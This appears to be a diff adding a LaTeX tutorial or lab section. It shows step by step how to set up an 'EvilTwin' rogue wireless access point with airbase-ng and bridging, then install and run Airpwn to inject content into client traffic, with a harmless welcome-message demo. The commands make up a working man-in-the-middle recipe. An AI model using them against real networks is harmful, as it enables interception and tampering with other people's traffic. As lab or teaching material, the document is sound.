@@ -1,0 +1,53 @@
+\subsection{Spoof Access Point and AirPwn}
+\subsubsection*{Prerequisites}
+This is performed on Backtrack 5 Rev 3 running on VirtualBox with Windows 7 as the host operating system. The host machine must be connected to the wireless router via ethernet, and the correct adapter selected in VirtualBox’s Network Settings options menu.
+
+The wireless adapter utilized during this is the Alfa AWUSO36H.
+\subsubsection*{Spoofing a Wireless Access Point}
+Set the wireless adaptor to monitor and promiscuous mode:
+\begin{center}
+\begin{lstlisting}[language=bash]
+ifconfig wlan0 promisc
+airmon-ng start wlan0
+\end{lstlisting}
+\end{center}
+Create the soft access point:
+\begin{lstlisting}[language=bash]
+airbase-ng --essid EvilTwin -c 11 mon0
+\end{lstlisting}
+Setup the bridge between the wired and wireless interface:
+\begin{lstlisting}[language=bash]
+brctl addbr eviltwin-bridge
+brctl addif eviltwin-bridge eth0
+brctl addif eviltwin-bridge at0
+ifconfig eth0 up
+ifconfig at0 up
+ifconfig eviltwin-bridge 192.168.1.133 up
+\end{lstlisting}
+Turn on IP forwarding:
+\begin{lstlisting}[language=bash]
+echo 1 > /proc/sys/net/ipv4/ip_forward
+\end{lstlisting}
+You should now be able to connect a client to the EvilTwin AP.
+
+\subsubsection*{Airpwn}
+
+\subsubsection*{Installation}
+\subsubsection*{Python2.4}
+
+Grab the .deb package files and either install that using the package manager or dpkg -i:
+\begin{verbatim}
+https://launchpad.net/~fkrull/+archive/deadsnakes/+build/4519648/+files/python2.4-minimal_2.4.6-5\%2Blucid1_i386.deb
+https://launchpad.net/~fkrull/+archive/deadsnakes/+build/4519648/+files/python2.4_2.4.6-5\%2Blucid1_i386.deb
+https://launchpad.net/~fkrull/+archive/deadsnakes/+build/4519648/+files/libpython2.4_2.4.6-5\%2Blucid1_i386.deb
+https://launchpad.net/~fkrull/+archive/deadsnakes/+build/4519648/+files/python2.4-dev_2.4.6-5\%2Blucid1_i386.deb
+\end{verbatim}
+Some extra dependencies may be required, but can either be fulfilled by apt-get install or grabbing a .dep for Lucid.
+
+
+\subsection*{Running Airpwn}
+In the Airpwn directory:
+\begin{lstlisting}[language=bash]
+airpwn -c conf/greet_html -d mac80211 -i mon0 -v
+\end{lstlisting}
+This will run Airpwn with a demo injection that will display a welcome message instead of the requested content.
